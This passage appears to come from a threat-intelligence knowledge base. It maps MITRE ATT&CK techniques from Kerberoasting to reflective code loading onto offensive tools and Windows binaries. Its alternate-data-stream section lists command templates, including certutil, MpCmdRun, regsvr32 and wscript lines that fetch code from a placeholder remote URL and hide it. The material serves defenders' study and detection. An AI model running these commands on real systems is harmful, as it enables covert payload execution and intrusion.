- [Impacket](../tools/unknown/impacket.md) — explicit, source. [Impacket](https://attack.mitre.org/software/S0357) modules like GetUserSPNs can be used to get Service Principal Names (SPNs) for user accounts. The output is formatted to be compatible with cracking tools like John the Ripper and Hashcat.(Citation: Impacket Tools)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Invoke-Kerberoast</code> module can request service tickets and return crackable ticket hashes.(Citation: PowerSploit Invoke Kerberoast)(Citation: Harmj0y Kerberoast Nov 2016)
- [Rubeus](../tools/unknown/rubeus.md) — explicit, source. [Rubeus](https://attack.mitre.org/software/S1071) can use the `KerberosRequestorSecurityToken.GetRequest` method to request kerberoastable service tickets.(Citation: GitHub Rubeus March 2023)
- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) contains a module to conduct Kerberoasting.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1558.004 - AS-REP Roasting

- [Rubeus](../tools/unknown/rubeus.md) — explicit, source. [Rubeus](https://attack.mitre.org/software/S1071) can reveal the credentials of accounts that have Kerberos pre-authentication disabled through AS-REP roasting.(Citation: GitHub Rubeus March 2023)(Citation: DFIR Ryuk's Return October 2020)(Citation: DFIR Ryuk 2 Hour Speed Run November 2020) 

## T1558.005 - Ccache Files

- [Impacket](../tools/unknown/impacket.md) — explicit, source. [Impacket](https://attack.mitre.org/software/S0357) tools – such as <code>getST.py</code> or <code>ticketer.py</code> – can be used to steal or forge Kerberos tickets using ccache files given a password, hash, aesKey, or TGT.(Citation: Kerberos GNU/Linux)(Citation: on security kerberos linux)

## T1559.001 - Component Object Model

- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) can insert malicious shellcode into Excel.exe using a `Microsoft.Office.Interop` object.(Citation: Github_SILENTTRINITY) 

## T1560 - Archive Collected Data

- [BloodHound](../tools/unknown/bloodhound.md) — explicit, source. [BloodHound](https://attack.mitre.org/software/S0521) can compress data collected by its SharpHound ingestor into a ZIP file to be written to disk.(Citation: GitHub Bloodhound)(Citation: Trend Micro Black Basta October 2022)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can ZIP directories on the target system.(Citation: Github PowerShell Empire)
- [ShimRatReporter](../tools/unknown/shimratreporter.md) — explicit, source. [ShimRatReporter](https://attack.mitre.org/software/S0445) used LZ compression to compress initial reconnaissance reports before sending to the C2.(Citation: FOX-IT May 2016 Mofang)	

## T1560.001 - Archive via Utility

- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) contains a module for compressing data using ZIP.(Citation: GitHub PoshC2)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) can compress data with Zip before sending it over C2.(Citation: GitHub Pupy)
- [Rclone](../tools/unknown/rclone.md) — explicit, source. [Rclone](https://attack.mitre.org/software/S1040) can compress files using `gzip` prior to exfiltration.(Citation: Rclone)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can zip files and folders for upload.(Citation: Fortinet Remcos Campaign NOV 2024)
- [certutil](../tools/unknown/certutil.md) — explicit, source. [certutil](https://attack.mitre.org/software/S0160) may be used to Base64 encode collected data.(Citation: TechNet Certutil)(Citation: LOLBAS Certutil)

## T1561.001 - Disk Content Wipe

- [RawDisk](../tools/unknown/rawdisk.md) — explicit, source. [RawDisk](https://attack.mitre.org/software/S0364) has been used to directly access the hard disk to help overwrite arbitrarily sized portions of disk content.(Citation: Novetta Blockbuster Destructive Malware)
- [cipher.exe](../tools/unknown/cipher.exe.md) — explicit, source. [cipher.exe](https://attack.mitre.org/software/S1205) can be used to overwrite deleted data in specified folders.(Citation: Nearest Neighbor Volexity)

## T1561.002 - Disk Structure Wipe

- [Diskpart](../tools/unknown/diskpart.md) — explicit, source. [Diskpart](https://attack.mitre.org/software/S9002) can be used to delete a partition or a volume.(Citation: Microsoft_diskpart_Feb2023) [Diskpart](https://attack.mitre.org/software/S9002) can also be used to remove all partitions or volume formatting from the selected disk.(Citation: Trendmicro_RansomHub_Dec2024)   
- [RawDisk](../tools/unknown/rawdisk.md) — explicit, source. [RawDisk](https://attack.mitre.org/software/S0364) was used in [Shamoon](https://attack.mitre.org/software/S0140) to help overwrite components of disk structure like the MBR and disk partitions.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018)

## T1564 - Hide Artifacts

- [DeviceCredentialDeployment.exe](../tools/windows/devicecredentialdeployment.exe.md) — explicit, source. Command metadata lists T1564: DeviceCredentialDeployment
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can modify file attributes to hide the file.(Citation: Fortinet Remcos Campaign NOV 2024)
- [msxsl.exe](../tools/windows/msxsl.exe.md) — explicit, source. Command metadata lists T1564: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name

## T1564.001 - Hidden Files and Directories

- [Imminent Monitor](../tools/unknown/imminent-monitor.md) — explicit, source. [Imminent Monitor](https://attack.mitre.org/software/S0434) has a dynamic debugging feature to set the file attribute to hidden.(Citation: QiAnXin APT-C-36 Feb2019)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. 
[QuasarRAT](https://attack.mitre.org/software/S0262) has the ability to set file attributes to "hidden" to hide files from the compromised user's view in Windows File Explorer.(Citation: CISA AR18-352A Quasar RAT December 2018)
- [attrib](../tools/unknown/attrib.md) — explicit, source. [attrib](https://attack.mitre.org/software/S1176) can be used to make files or directories hidden.(Citation: Microsoft attrib 2023)(Citation: gbhackers Darkgate Malware 2024)(Citation: LogRhythm WannaCry)(Citation: Checkpoint WannaCry 2017)(Citation: Unit42 ComboJack 2018) 

## T1564.003 - Hidden Window

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. 
[AsyncRAT](https://attack.mitre.org/software/S1087) can hide the execution of scheduled tasks using `ProcessWindowStyle.Hidden`.(Citation: Telefonica Snip3 December 2021)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) has used the command <code>Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden</code> to hide its window.(Citation: MalwareBytes LazyScripter Feb 2021)
- [MCMD](../tools/unknown/mcmd.md) — explicit, source. [MCMD](https://attack.mitre.org/software/S0500) can modify processes to prevent them from being visible on the desktop.(Citation: Secureworks MCMD July 2019)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can hide process windows and make web requests invisible to the compromised user. Requests marked as invisible have been sent with user-agent string `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A` though [QuasarRAT](https://attack.mitre.org/software/S0262) can only be run on Windows systems.(Citation: CISA AR18-352A Quasar RAT December 2018)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can set `ProcessWindowStyle.Hidden` to hide windows.(Citation: Check Point Blind Eagle MAR 2025)

- [SILENTTRINITY](../tools/unknown/silenttrinity.md) — explicit, source. [SILENTTRINITY](https://attack.mitre.org/software/S0692) has the ability to set its window state to hidden.(Citation: GitHub SILENTTRINITY Modules July 2019)

## T1564.004 - NTFS File Attributes

- [Bitsadmin.exe](../tools/windows/bitsadmin.exe.md) — explicit, source. Command metadata lists T1564.004: bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RE...
- [Certutil.exe](../tools/windows/certutil.exe.md) — explicit, source. Command metadata lists T1564.004: certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt
- [Cmd.exe](../tools/windows/cmd.exe.md) — explicit, source. Command metadata lists T1564.004: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:{REMOTEURL:.sct} ^scrobj.dll > {PATH}:payload.bat
- [Cscript.exe](../tools/windows/cscript.exe.md) — explicit, source. Command metadata lists T1564.004: cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs
- [Diantz.exe](../tools/windows/diantz.exe.md) — explicit, source. Command metadata lists T1564.004: diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab
- [Esentutl.exe](../tools/windows/esentutl.exe.md) — explicit, source. Command metadata lists T1564.004: esentutl.exe /y {PATH_SMB:.source.exe} /d {PATH_SMB:.dest.exe} /o
- [Expand](../tools/unknown/expand.md) — explicit, source. [Expand](https://attack.mitre.org/software/S0361) can be used to download or copy a file into an alternate data stream.(Citation: LOLBAS Expand)
- [Expand.exe](../tools/windows/expand.exe.md) — explicit, source. Command metadata lists T1564.004: expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat
- [Extrac32.exe](../tools/windows/extrac32.exe.md) — explicit, source. Command metadata lists T1564.004: extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe
- [Findstr.exe](../tools/windows/findstr.exe.md) — explicit, source. Command metadata lists T1564.004: findstr /V /L W3AllLov3LolBas {PATH_SMB:.exe} > {PATH_ABSOLUTE}:file.exe
- [Forfiles.exe](../tools/windows/forfiles.exe.md) — explicit, source. Command metadata lists T1564.004: forfiles /p c:\windows\system32 /m notepad.exe /c "{PATH_ABSOLUTE}:evil.exe"
- [Makecab.exe](../tools/windows/makecab.exe.md) — explicit, source. Command metadata lists T1564.004: makecab {PATH_SMB:.exe} {PATH_ABSOLUTE}:file.cab
- [Mavinject.exe](../tools/windows/mavinject.exe.md) — explicit, source. Command metadata lists T1564.004: Mavinject.exe 4172 /INJECTRUNNING {PATH_ABSOLUTE}:file.dll
- [MpCmdRun.exe](../tools/windows/mpcmdrun.exe.md) — explicit, source. Command metadata lists T1564.004: MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}:evil.exe
- [Print.exe](../tools/windows/print.exe.md) — explicit, source. Command metadata lists T1564.004: print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
- [PrintBrm.exe](../tools/windows/printbrm.exe.md) — explicit, source. Command metadata lists T1564.004: PrintBrm -r -f {PATH_ABSOLUTE}:hidden.zip -d {PATH_ABSOLUTE:folder}
- [Reg.exe](../tools/windows/reg.exe.md) — explicit, source. Command metadata lists T1564.004: reg export HKLM\SOFTWARE\Microsoft\Evilreg {PATH_ABSOLUTE}:evilreg.reg
- [Regedit.exe](../tools/windows/regedit.exe.md) — explicit, source. Command metadata lists T1564.004: regedit {PATH_ABSOLUTE}:regfile.reg
- [Regini.exe](../tools/windows/regini.exe.md) — explicit, source. Command metadata lists T1564.004: regini.exe {PATH}:hidden.ini
- [Rundll32.exe](../tools/windows/rundll32.exe.md) — explicit, source. Command metadata lists T1564.004: rundll32 "{PATH}:ADSDLL.dll",DllMain
- [Sc.exe](../tools/windows/sc.exe.md) — explicit, source. Command metadata lists T1564.004: sc config {ExistingServiceName} binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" & sc start {ExistingServiceName}
- [Tar.exe](../tools/windows/tar.exe.md) — explicit, source. Command metadata lists T1564.004: tar -xf {PATH}:ads
- [Wmic.exe](../tools/windows/wmic.exe.md) — explicit, source. Command metadata lists T1564.004: wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"
- [Wscript.exe](../tools/windows/wscript.exe.md) — explicit, source. Command metadata lists T1564.004: echo GetObject("script:{REMOTEURL:.js}") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js
- [esentutl](../tools/unknown/esentutl.md) — explicit, source. [esentutl](https://attack.mitre.org/software/S0404) can be used to read and write alternate data streams.(Citation: LOLBAS Esentutl)

## T1566.001 - Spearphishing Attachment

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) has been delivered via malicious email attachments.(Citation: Recorded Future TAG-144 AUG 2025)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) has been spread through emails containing malicious documents.(Citation: Fortinet Remcos Campaign NOV 2024)

## T1566.002 - Spearphishing Link

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can send "consent phishing" emails containing malicious links designed to steal users’ access tokens.(Citation: AADInternals Documentation)

## T1567 - Exfiltration Over Web Service

- [ConfigSecurityPolicy.exe](../tools/windows/configsecuritypolicy.exe.md) — explicit, source. Command metadata lists T1567: ConfigSecurityPolicy.exe {PATH_ABSOLUTE} {REMOTEURL}
- [DataSvcUtil.exe](../tools/windows/datasvcutil.exe.md) — explicit, source. Command metadata lists T1567: DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}
- [ngrok](../tools/unknown/ngrok.md) — explicit, source. [ngrok](https://attack.mitre.org/software/S0508) has been used by threat actors to configure servers for data exfiltration.(Citation: MalwareBytes Ngrok February 2020)

## T1567.001 - Exfiltration to Code Repository

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use GitHub for data exfiltration.(Citation: Github PowerShell Empire)

## T1567.002 - Exfiltration to Cloud Storage

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use Dropbox for data exfiltration.(Citation: Github PowerShell Empire)
- [Rclone](../tools/unknown/rclone.md) — explicit, source. [Rclone](https://attack.mitre.org/software/S1040) can exfiltrate data to cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA.(Citation: Rclone)(Citation: DFIR Conti Bazar Nov 2021)

## T1568 - Dynamic Resolution

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) can be configured to use dynamic DNS.(Citation: AsyncRAT GitHub)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) has used dynamic DNS domains in C2 communications.(Citation: Check Point Blind Eagle MAR 2025)

## T1568.002 - Domain Generation Algorithms

- [AsyncRAT](../tools/unknown/asyncrat.md) — explicit, source. [AsyncRAT](https://attack.mitre.org/software/S1087) use a DGA to generate a C2 domains.(Citation: ESET MirrorFace 2025)
- [ngrok](../tools/unknown/ngrok.md) — explicit, source. [ngrok](https://attack.mitre.org/software/S0508) can provide DGA for C2 servers through the use of random URL strings that change every 12 hours.(Citation: Zdnet Ngrok September 2018)

## T1569.002 - Service Execution

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. 
[Brute Ratel C4](https://attack.mitre.org/software/S1063) can create Windows system services for execution.(Citation: Palo Alto Brute Ratel July 2022)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use [PsExec](https://attack.mitre.org/software/S0029) to execute a payload on a remote host.(Citation: Github PowerShell Empire)
- [Impacket](../tools/unknown/impacket.md) — explicit, source. [Impacket](https://attack.mitre.org/software/S0357) contains various modules emulating other service execution tools such as [PsExec](https://attack.mitre.org/software/S0029).(Citation: Impacket Tools)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can run a command on another machine using [PsExec](https://attack.mitre.org/software/S0029).(Citation: Github Koadic)
- [Net](../tools/unknown/net.md) — explicit, source. The <code>net start</code> and <code>net stop</code> commands can be used in [Net](https://attack.mitre.org/software/S0039) to execute or stop Windows services.(Citation: Savill 1999)
- [PoshC2](../tools/unknown/poshc2.md) — explicit, source. [PoshC2](https://attack.mitre.org/software/S0378) contains an implementation of [PsExec](https://attack.mitre.org/software/S0029) for remote execution.(Citation: GitHub PoshC2)
- [PsExec](../tools/unknown/psexec.md) — explicit, source. Microsoft Sysinternals [PsExec](https://attack.mitre.org/software/S0029) is a popular administration tool that can be used to execute binaries on remote systems using a temporary Windows service.(Citation: Russinovich Sysinternals)
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192) uses [PsExec](https://attack.mitre.org/software/S0029) to execute a payload or commands on a remote host.(Citation: GitHub Pupy)
- [Winexe](../tools/unknown/winexe.md) — explicit, source. [Winexe](https://attack.mitre.org/software/S0191) installs a service on the remote system, executes the command, then uninstalls the service.(Citation: Secpod Winexe June 2017)
- [xCmd](../tools/unknown/xcmd.md) — explicit, source. [xCmd](https://attack.mitre.org/software/S0123) can be used to execute binaries on remote systems by creating and starting a service.(Citation: xCmd)

## T1570 - Lateral Tool Transfer

- [BITSAdmin](../tools/unknown/bitsadmin.md) — explicit, source. [BITSAdmin](https://attack.mitre.org/software/S0190) can be used to create [BITS Jobs](https://attack.mitre.org/techniques/T1197) to upload and/or download files from SMB file servers.(Citation: Microsoft About BITS)
- [Expand](../tools/unknown/expand.md) — explicit, source. [Expand](https://attack.mitre.org/software/S0361) can be used to download or upload a file over a network share.(Citation: LOLBAS Expand)
- [Impacket](../tools/unknown/impacket.md) — explicit, source. [Impacket](https://attack.mitre.org/software/S0357) has used its `wmiexec` command, leveraging Windows Management Instrumentation, to remotely stage and execute payloads in victim networks.(Citation: Sygnia VelvetAnt 2024A)
- [PsExec](../tools/unknown/psexec.md) — explicit, source. [PsExec](https://attack.mitre.org/software/S0029) can be used to download or upload a file over a network share.(Citation: PsExec Russinovich)
- [cmd](../tools/unknown/cmd.md) — explicit, source. [cmd](https://attack.mitre.org/software/S0106) can be used to copy files to/from a remotely connected internal system.(Citation: TechNet Copy)
- [esentutl](../tools/unknown/esentutl.md) — explicit, source. [esentutl](https://attack.mitre.org/software/S0404) can be used to copy files to/from a remote share.(Citation: LOLBAS Esentutl)
- [ftp](../tools/unknown/ftp.md) — explicit, source. [ftp](https://attack.mitre.org/software/S0095) may be abused by adversaries to transfer tools or files between systems within a compromised environment.(Citation: Microsoft FTP)(Citation: Linux FTP)

## T1571 - Non-Standard Port

- [Covenant](../tools/unknown/covenant.md) — explicit, source. [Covenant](https://attack.mitre.org/software/S1155) listeners and controllers can be configured to use non-standard ports.(Citation: Github Covenant)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can use port 4782 on the compromised host for TCP callbacks.(Citation: CISA AR18-352A Quasar RAT December 2018)

## T1572 - Protocol Tunneling

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) can use DNS over HTTPS for C2.(Citation: Palo Alto Brute Ratel July 2022)(Citation: Trend Micro Black Basta October 2022)
- [FRP](../tools/unknown/frp.md) — explicit, source. [FRP](https://attack.mitre.org/software/S1144) can tunnel SSH and Unix Domain Socket communications over TCP between external nodes and exposed resources behind firewalls or NAT.(Citation: FRP GitHub)
- [Mythic](../tools/unknown/mythic.md) — explicit, source. [Mythic](https://attack.mitre.org/software/S0699) can use SOCKS proxies to tunnel traffic through another protocol.(Citation: Mythc Documentation)
- [ngrok](../tools/unknown/ngrok.md) — explicit, source. [ngrok](https://attack.mitre.org/software/S0508) can tunnel RDP and other services securely over internet connections.(Citation: FireEye Maze May 2020)(Citation: Cyware Ngrok May 2019)(Citation: MalwareBytes Ngrok February 2020)(Citation: Trend Micro Ngrok September 2020)

## T1573.001 - Symmetric Cryptography

- [FRP](../tools/unknown/frp.md) — explicit, source. [FRP](https://attack.mitre.org/software/S1144) can use STCP (Secret TCP) with a preshared key to encrypt services exposed to public networks.(Citation: FRP GitHub)
- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) uses AES with a hardcoded pre-shared key to encrypt network communication.(Citation: GitHub QuasarRAT)(Citation: Volexity Patchwork June 2018)(Citation: CISA AR18-352A Quasar RAT December 2018)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) can use AES-GCM-256 to encrypt a session key for C2 message exchange.(Citation: GitHub Sliver Encryption)

## T1573.002 - Asymmetric Cryptography

- [Covenant](../tools/unknown/covenant.md) — explicit, source. [Covenant](https://attack.mitre.org/software/S1155) can utilize SSL to encrypt command and control traffic.(Citation: Github Covenant)
- [DCRAT](../tools/unknown/dcrat.md) — explicit, source. [DCRAT](https://attack.mitre.org/software/S9017) can use certificate-based authentication for C2 servers.(Citation: Zscaler BlindEagle DEC 2025)

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) can use TLS to encrypt its C2 channel.(Citation: Github PowerShell Empire)
- [FRP](../tools/unknown/frp.md) — explicit, source. [FRP](https://attack.mitre.org/software/S1144) can be configured to only accept TLS connections.(Citation: FRP GitHub)
- [Koadic](../tools/unknown/koadic.md) — explicit, source. [Koadic](https://attack.mitre.org/software/S0250) can use SSL and TLS for communications.(Citation: Github Koadic)
- [Mythic](../tools/unknown/mythic.md) — explicit, source. [Mythic](https://attack.mitre.org/software/S0699) supports SSL encrypted C2.(Citation: Mythc Documentation)	
- [Pupy](../tools/unknown/pupy.md) — explicit, source. [Pupy](https://attack.mitre.org/software/S0192)'s default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.(Citation: GitHub Pupy)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can use TLS to encrypt C2 communication.(Citation: Fortinet Remcos Campaign NOV 2024)
- [Sliver](../tools/unknown/sliver.md) — explicit, source. [Sliver](https://attack.mitre.org/software/S0633) can use mutual TLS and RSA  cryptography to exchange a session key.(Citation: Cybersecurity Advisory SVR TTP May 2021)(Citation: Bishop Fox Sliver Framework August 2019)(Citation: GitHub Sliver Encryption)(Citation: Cybereason Sliver Undated)(Citation: Microsoft Sliver 2022)
- [Tor](../tools/unknown/tor.md) — explicit, source. [Tor](https://attack.mitre.org/software/S0183) encapsulates traffic in multiple layers of encryption, using TLS by default.(Citation: Dingledine Tor The Second-Generation Onion Router)

## T1574.001 - DLL

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) has used search order hijacking to load a malicious payload DLL as a dependency to a benign application packaged in the same ISO.(Citation: Palo Alto Brute Ratel July 2022) [Brute Ratel C4](https://attack.mitre.org/software/S1063) has loaded a malicious DLL by spoofing the name of the legitimate Version.DLL and placing it in the same folder as the digitally-signed Microsoft binary OneDriveUpdater.exe.(Citation: Palo Alto Brute Ratel July 2022)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) contains modules that can discover and exploit various DLL hijacking opportunities.(Citation: Github PowerShell Empire)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of Privesc-PowerUp modules that can discover and exploit DLL hijacking opportunities in services and processes.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)

## T1574.004 - Dylib Hijacking

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) has a dylib hijacker module that generates a malicious dylib given the path to a legitimate dylib of a vulnerable application.(Citation: Github PowerShell Empire)

## T1574.007 - Path Interception by PATH Environment Variable

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) contains modules that can discover and exploit path interception opportunities in the PATH environment variable.(Citation: Github PowerShell Empire)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of Privesc-PowerUp modules that can discover and exploit path interception opportunities in the PATH environment variable.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)

## T1574.008 - Path Interception by Search Order Hijacking

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) contains modules that can discover and exploit search order hijacking vulnerabilities.(Citation: Github PowerShell Empire)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of Privesc-PowerUp modules that can discover and exploit search order hijacking vulnerabilities.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)

## T1574.009 - Path Interception by Unquoted Path

- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) contains modules that can discover and exploit unquoted path vulnerabilities.(Citation: Github PowerShell Empire)
- [PowerSploit](../tools/unknown/powersploit.md) — explicit, source. [PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of Privesc-PowerUp modules that can discover and exploit unquoted path vulnerabilities.(Citation: GitHub PowerSploit May 2012)(Citation: PowerSploit Documentation)

## T1578.001 - Create Snapshot

- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can create snapshots of EBS volumes and RDS instances.(Citation: GitHub Pacu)

## T1580 - Cloud Infrastructure Discovery

- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can enumerate AWS infrastructure, such as EC2 instances.(Citation: GitHub Pacu)
- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) can enumerate AWS Infrastructure to include EC2 instances.(Citation: Github TruffleSecurity Trufflehog April 2025)

## T1589.002 - Email Addresses

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can check for the existence of user email addresses using public Microsoft APIs.(Citation: AADInternals Documentation)(Citation: Azure AD Recon)

## T1590.001 - Domain Properties

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can gather information about a tenant’s domains using public Microsoft APIs.(Citation: AADInternals Documentation)(Citation: Azure AD Recon)

## T1598.003 - Spearphishing Link

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can send phishing emails containing malicious links designed to collect users’ credentials.(Citation: AADInternals Documentation)
- [evilginx2](../tools/unknown/evilginx2.md) — explicit, source. [evilginx2](https://attack.mitre.org/software/S9003) can generate and display phishing URLs including hidden tracking pixels and can also embed URLs within iframes for browser-in-the-browser phishing.(Citation: Breakdev Evilginx 2.3 JAN 2019)(Citation: Breakdev Evilginx 3.3 APR 2024)(Citation: Sophos Evilginx MAR 2025)


## T1606.002 - SAML Tokens

- [AADInternals](../tools/unknown/aadinternals.md) — explicit, source. [AADInternals](https://attack.mitre.org/software/S0677) can be used to create SAML tokens using the AD Federated Services token signing certificate.(Citation: AADInternals Documentation)

## T1609 - Container Administration Command

- [Peirates](../tools/unknown/peirates.md) — explicit, source. [Peirates](https://attack.mitre.org/software/S0683) can use `kubectl` or the Kubernetes API to run commands.(Citation: Peirates GitHub)

## T1610 - Deploy Container

- [Peirates](../tools/unknown/peirates.md) — explicit, source. [Peirates](https://attack.mitre.org/software/S0683) can deploy a pod that mounts its node’s root file system, then execute a command to create a reverse shell on the node.(Citation: Peirates GitHub)

## T1611 - Escape to Host

- [Peirates](../tools/unknown/peirates.md) — explicit, source. [Peirates](https://attack.mitre.org/software/S0683) can gain a reverse shell on a host node by mounting the Kubernetes hostPath.(Citation: Peirates GitHub)

## T1613 - Container and Resource Discovery

- [Peirates](../tools/unknown/peirates.md) — explicit, source. [Peirates](https://attack.mitre.org/software/S0683) can enumerate Kubernetes pods in a given namespace.(Citation: Peirates GitHub)

## T1614 - System Location Discovery

- [QuasarRAT](../tools/unknown/quasarrat.md) — explicit, source. [QuasarRAT](https://attack.mitre.org/software/S0262) can determine the country a victim host is located in.(Citation: CISA AR18-352A Quasar RAT December 2018)
- [Remcos](../tools/unknown/remcos.md) — explicit, source. [Remcos](https://attack.mitre.org/software/S0332) can identify the location of targeted devices.(Citation: Fortinet Remcos Campaign NOV 2024)

## T1615 - Group Policy Discovery

- [BloodHound](../tools/unknown/bloodhound.md) — explicit, source. [BloodHound](https://attack.mitre.org/software/S0521) has the ability to collect local admin information via GPO.(Citation: GitHub Bloodhound)
- [Empire](../tools/unknown/empire.md) — explicit, source. [Empire](https://attack.mitre.org/software/S0363) includes various modules for enumerating Group Policy.(Citation: Github PowerShell Empire)

## T1619 - Cloud Storage Object Discovery

- [Pacu](../tools/unknown/pacu.md) — explicit, source. [Pacu](https://attack.mitre.org/software/S1091) can enumerate AWS storage services, such as S3 buckets and Elastic Block Store volumes.(Citation: GitHub Pacu)
- [Peirates](../tools/unknown/peirates.md) — explicit, source. [Peirates](https://attack.mitre.org/software/S0683) can list AWS S3 buckets.(Citation: Peirates GitHub)
- [TruffleHog](../tools/unknown/trufflehog.md) — explicit, source. [TruffleHog](https://attack.mitre.org/software/S9009) can enumerate cloud storage environments including Amazon Web Service (AWS) S3 buckets and Google Cloud Storage buckets.(Citation: Black Hills Information Security TruffleHog January 2024)(Citation: Github TruffleSecurity Trufflehog April 2025)

## T1620 - Reflective Code Loading

- [Brute Ratel C4](../tools/unknown/brute-ratel-c4.md) — explicit, source. [Brute Ratel C4](https://attack.mitre.org/software/S1063) has used reflective loading to execute malicious DLLs.(Citation: MDSec Brute Ratel August 2022)
- [Donut](../tools/unknown/donut.md) — explicit, source. [Donut](https://attack.mitre.org/software/S0695) can generate code modules that enable in-memory execution of VBScript, JScript, EXE, DLL, and dotNET payloads.(Citation: Donut Github)
